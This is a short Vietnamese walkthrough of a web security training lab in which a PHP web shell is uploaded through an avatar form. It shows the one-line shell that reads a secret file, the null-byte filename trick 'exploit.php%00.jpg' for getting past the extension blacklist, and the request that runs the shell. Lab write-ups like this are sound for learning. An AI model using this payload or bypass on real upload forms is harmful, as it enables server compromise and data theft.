# Lab: Web shell upload via obfuscated file extension

> Phòng lab này chứa lỗ hổng file upload trong phần upload avatar. Phần mở rộng của file upload nằm trong blacklist nhưng vẫn có thể bypass nó bằng một số cách thức đặc biệt.
> 
> Để giải quyết phòng lab, hãy tải lên một web shell PHP cơ bản và sử dụng nó để lấy nội dung của file mật `/home/carlos/secret`. Gửi nội dung lấy được bằng nút **Submit**
>
> Hãy đăng nhập vào account `wiener:peter` để upload avatar

Thử upload file `exploit.php` với nội dung `<?php echo file_get_contents('/home/carlos/secret') ?>` thì nhận được phản hồi ***Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.***

Trang web chỉ cho tải lên tệp có định dạng JPG & PNG. Mình có thể sửa bằng cách thêm byte null (`%00`) và đuôi .png vào tên file. `filename="exploit.php%00.jpg"`

Chuyển sang tab repeater và dùng lệnh `GET /files/avatars/exploit.php`
